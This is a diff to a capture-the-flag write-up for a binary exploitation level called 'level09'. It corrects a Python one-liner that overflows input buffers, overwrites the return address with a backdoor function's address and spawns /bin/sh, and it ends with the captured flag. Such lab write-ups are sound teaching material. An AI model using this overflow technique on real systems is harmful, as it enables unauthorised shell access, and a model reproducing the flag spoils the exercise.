@@ -15,7 +15,7 @@ Then we only have to overflow the username (first input) into the len with 40 ch
 Finally in the message input, we can put any 200 characters followed by the address of the secret backdoor we found at the begining and simply put it in EIP.
 
 ```bash
-(python -c 'print "N" * 40 + "\xd0" + "\n" + "N" * 200 "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh" ' ; cat) | ./level09
+(python -c 'print "N" * 40 + "\xd0" + "\n" + "N" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh" ' ; cat) | ./level09
 ```
 
 Flag : j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
